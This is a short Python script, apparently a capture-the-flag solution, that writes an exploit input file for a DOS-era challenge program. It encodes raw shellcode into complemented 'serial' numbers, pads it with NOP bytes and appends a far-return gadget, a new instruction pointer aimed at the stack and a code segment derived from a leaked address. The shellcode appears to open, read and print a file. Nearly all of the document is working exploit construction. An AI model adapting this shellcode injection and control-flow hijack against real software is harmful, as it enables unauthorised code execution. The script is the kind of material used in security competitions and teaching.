def shellcode_to_serials(b):
    nb = len(b)
    if nb > 28:
        return None
    if nb <= 28:
        b += b"\x90" * (28 - nb)
        nb = 28
    serials = b""
    for i in range(0, nb, 2):
        word = int.from_bytes(b[i:i+2], "little")
        print(hex(word))
        complemented = (~word)
        serials += str(complemented).encode() + b" "
    return serials

id = b"capturetheflag"
# 2 bytes for BP + 2 bytes for IP + 4 bytes for RETF args
new_lines = b"10 " * 8

shellcode = bytes.fromhex("81ec8000bac201b43dcd2189c3b94000b43fcd2189d3b409cd21")

# extra_serials = b"0 " * 14
extra_serials = shellcode_to_serials(shellcode)

ret = str(~0xc1e).encode() + b" "                     # RETF gadget
new_ip = str(~(0xffb4 - (2*14))).encode() + b" "      # IP = SP
#es_leak = 0x192
es_leak = 0x3a5
new_cs = str(~(es_leak + 0x10 + 0x30a)).encode()                         # CS = SS

f = open("exploit.txt", "wb")
f.write(id + b"\n\r")
f.write(new_lines + extra_serials + ret + new_ip + new_cs + b"\n\r")